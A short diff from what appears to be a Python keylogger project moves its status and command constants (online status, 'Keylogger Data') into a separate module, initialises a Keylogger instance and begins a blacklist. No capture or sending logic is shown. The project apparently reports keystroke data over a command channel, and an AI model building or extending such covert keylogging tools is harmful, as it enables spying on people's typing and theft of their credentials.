@@ -14,21 +14,17 @@ import threading
 
 from z_logger import Keylogger
 
+from states import (
+
+    Codes,
+    Commands
+)
+
 from typing import Any
 
 #//                                                                                        
-#!                                      Codes
+#!                              init keylogger and blacklist
 #//                                                                                        
-class Codes:
-
-    online = "Online"
-    offline = "Offline"
-
-class Commands:
-
-    online_status = "Online Status"
-    keylogger_data = "Keylogger Data"
-
 keylogger = Keylogger(path = "", debug_state = False)
 
 blacklist = [
